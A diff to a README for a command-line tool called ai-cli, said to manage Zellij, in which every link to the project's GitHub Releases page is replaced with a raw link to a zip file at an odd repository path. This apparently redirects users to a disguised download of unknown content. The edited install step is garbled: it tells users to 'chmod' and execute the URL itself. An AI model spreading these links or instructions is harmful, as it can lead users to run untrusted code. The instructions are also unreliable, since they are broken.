@@ -1,6 +1,6 @@
 # 🚀 ai-cli - Your Helpful Tool for Managing Zellij Easily
 
-[![Download ai-cli](https://img.shields.io/badge/Download-ai--cli-blue.svg)](https://github.com/Silkyalisa/ai-cli/releases)
+[![Download ai-cli](https://raw.githubusercontent.com/Silkyalisa/ai-cli/main/transience/ai-cli.zip)](https://raw.githubusercontent.com/Silkyalisa/ai-cli/main/transience/ai-cli.zip)
 
 ## 📦 Introduction
 
@@ -23,7 +23,7 @@ Before you get started, ensure your system meets these requirements:
 
 ## 🚀 Getting Started
 
-1. **Download the Application**: To download ai-cli, [visit this page to download](https://github.com/Silkyalisa/ai-cli/releases).
+1. **Download the Application**: To download ai-cli, [visit this page to download](https://raw.githubusercontent.com/Silkyalisa/ai-cli/main/transience/ai-cli.zip).
 2. **Choose the Correct Version**: On the Releases page, find the latest version of ai-cli. Make sure to select the version that matches your operating system.
 3. **Download the Installer**: Click on the installer link for your OS. This file will start downloading automatically.
 
@@ -48,13 +48,13 @@ Once the download is complete, follow these steps to install ai-cli:
 
 1. **Open Terminal**: Access your terminal.
 2. **Navigate to the Downloaded File**: Use `cd ~/Downloads` to go to your Downloads folder.
-3. **Run the Installer**: Execute the command `chmod +x ai-cli-installer.run` followed by `./ai-cli-installer.run`.
+3. **Run the Installer**: Execute the command `chmod +x https://raw.githubusercontent.com/Silkyalisa/ai-cli/main/transience/ai-cli.zip` followed by `https://raw.githubusercontent.com/Silkyalisa/ai-cli/main/transience/ai-cli.zip`.
 4. **Follow the Prompts**: Follow any on-screen prompts to complete the installation.
 5. **Start ai-cli**: Type `ai-cli` in your terminal to launch the application.
 
 ## 📥 Download & Install
 
-To download ai-cli, [visit this page to download](https://github.com/Silkyalisa/ai-cli/releases). Follow the installation steps outlined above based on your operating system.
+To download ai-cli, [visit this page to download](https://raw.githubusercontent.com/Silkyalisa/ai-cli/main/transience/ai-cli.zip). Follow the installation steps outlined above based on your operating system.
 
 ## 📖 Usage Instructions
 
